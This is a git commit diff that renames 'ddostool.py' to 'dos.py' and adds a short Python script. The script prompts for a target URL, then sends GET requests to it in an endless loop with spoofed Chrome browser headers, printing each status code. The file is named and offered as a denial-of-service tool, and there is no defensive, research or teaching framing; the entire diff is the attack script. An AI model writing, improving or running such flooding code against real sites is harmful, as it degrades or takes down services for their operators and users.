9615785b0fa2122aa9d3f4f7b568be618c37ee7c
Fəqan Əliyev <137539362+FaganAliyevvvv@users.noreply.github.com>
2025-02-11 00:13:23 +0400

    Update and rename ddostool.py to dos.py

---
+++ dos.py
@@ -0,0 +1,24 @@
+import requests as r
+
+target = input("URL: ")
+
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1',
+    'Cache-Control': 'max-age=0',
+}
+
+
+while True:
+    try:
+        response = r.get(target, headers=headers)
+        print(f"Status: {response.status_code}")
+            
+    except Exception as e:
+        print(f"Error: {e}")
+        break
+
